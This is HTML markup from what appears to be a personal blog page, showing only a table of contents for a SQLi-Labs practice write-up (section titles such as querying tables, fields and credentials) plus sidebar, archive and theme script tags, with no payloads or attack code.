href="#%E3%80%903%E3%80%91%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E8%A1%A8-1"><span class="toc-number">2.3.</span> <span class="toc-text">【3】获取所有表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%904%E3%80%91%E6%9F%A5%E8%AF%A2%E5%AD%97%E6%AE%B5-1"><span class="toc-number">2.4.</span> <span class="toc-text">【4】查询字段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%905%E3%80%91%E6%9F%A5%E8%AF%A2%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81-1"><span class="toc-number">2.5.</span> <span class="toc-text">【5】查询用户名和密码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-3"><span class="toc-number">3.</span> <span class="toc-text">Lesson 3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">3.1.</span> <span class="toc-text">源码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-4"><span class="toc-number">4.</span> <span class="toc-text">Lesson 4</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81-1"><span class="toc-number">4.1.</span> <span class="toc-text">源码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-5"><span class="toc-number">5.</span> <span class="toc-text">Lesson 5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#xmlupdate%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF"><span class="toc-number">5.1.</span> <span class="toc-text">xmlupdate报错注入思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81-2"><span class="toc-number">5.2.</span> <span class="toc-text">源码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-6"><span class="toc-number">6.</span> <span class="toc-text">Lesson 6</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%EF%BC%9A"><span class="toc-number">6.1.</span> <span class="toc-text">源码：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-7"><span class="toc-number">7.</span> <span class="toc-text">Lesson 7</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-8"><span class="toc-number">8.</span> <span class="toc-text">Lesson 8</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-9"><span class="toc-number">9.</span> <span class="toc-text">Lesson 9</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-10"><span class="toc-number">10.</span> <span class="toc-text">Lesson 10</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-11"><span class="toc-number">11.</span> <span class="toc-text">Lesson 11</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81-3"><span class="toc-number">11.1.</span> <span class="toc-text">源码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-12"><span class="toc-number">12.</span> <span class="toc-text">Lesson 12</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81-4"><span class="toc-number">12.1.</span> <span class="toc-text">源码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-13"><span class="toc-number">13.</span> <span class="toc-text">Lesson 13</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81-5"><span class="toc-number">13.1.</span> <span class="toc-text">源码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-14"><span class="toc-number">14.</span> <span class="toc-text">Lesson 14</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81-6"><span class="toc-number">14.1.</span> <span class="toc-text">源码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-15"><span class="toc-number">15.</span> <span class="toc-text">Lesson 15</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81-7"><span class="toc-number">15.1.</span> <span class="toc-text">源码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-16"><span class="toc-number">16.</span> <span class="toc-text">Lesson 16</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81-8"><span class="toc-number">16.1.</span> <span class="toc-text">源码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-17"><span class="toc-number">17.</span> <span class="toc-text">Lesson 17</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-18"><span class="toc-number">18.</span> <span class="toc-text">Lesson 18</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-19"><span class="toc-number">19.</span> <span class="toc-text">Lesson 19</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-20"><span class="toc-number">20.</span> <span class="toc-text">Lesson 20</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81-9"><span class="toc-number">20.1.</span> <span class="toc-text">源码</span></a></li></ol></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 1
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2022 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/10</span>
+            <a class="archive-post-title" href="/2022/11/10/SQLi-Labs%20Basic%20Challenges/">SQLi-Labs靶场刷题记录【Basic Challenges】</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "http://example.com",
+        root: siteMetaRoot,
+        author: "R4x"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20211217"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20211217"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20211217" async></script>
+        
+        <!-- mermaid -->
+        
+    </body>
+</html>
